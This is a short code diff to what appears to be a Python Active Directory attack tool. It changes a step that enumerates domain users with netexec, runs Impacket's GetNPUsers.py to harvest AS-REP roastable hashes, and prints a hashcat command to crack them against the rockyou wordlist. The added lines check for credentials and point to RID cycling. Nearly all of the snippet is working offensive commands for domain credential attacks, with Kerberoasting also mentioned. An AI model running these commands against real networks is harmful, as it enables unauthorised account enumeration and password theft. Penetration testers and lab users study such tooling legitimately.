@@ -87,7 +87,10 @@ def run():
             warn("Skipping Kerberoast SPN collection: credentials are required.")
 
     if c in ("7","A"):
-        run_cmd(f"nxc smb {dc} -u {user} -p {pw} -d {dom} --users | awk '/SMB/{{print $5}}' | grep -v '-' | grep -v '\\*' | tail -n +2 > /tmp/users.txt")
+        if user and pw:
+            run_cmd(f"nxc smb {dc} -u {user} -p {pw} -d {dom} --users | awk '/SMB/{{print $5}}' | grep -v '-' | grep -v '\\*' | tail -n +2 > /tmp/users.txt")
+        elif not os.path.exists("/tmp/users.txt") or os.path.getsize("/tmp/users.txt") == 0:
+            warn("No creds and no /tmp/users.txt — run RID cycling first ([3][7])")
         run_cmd(f"{imp('GetNPUsers.py')} {dom}/ -dc-ip {dc} -no-pass -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep.txt")
         info("Crack: hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt")
 
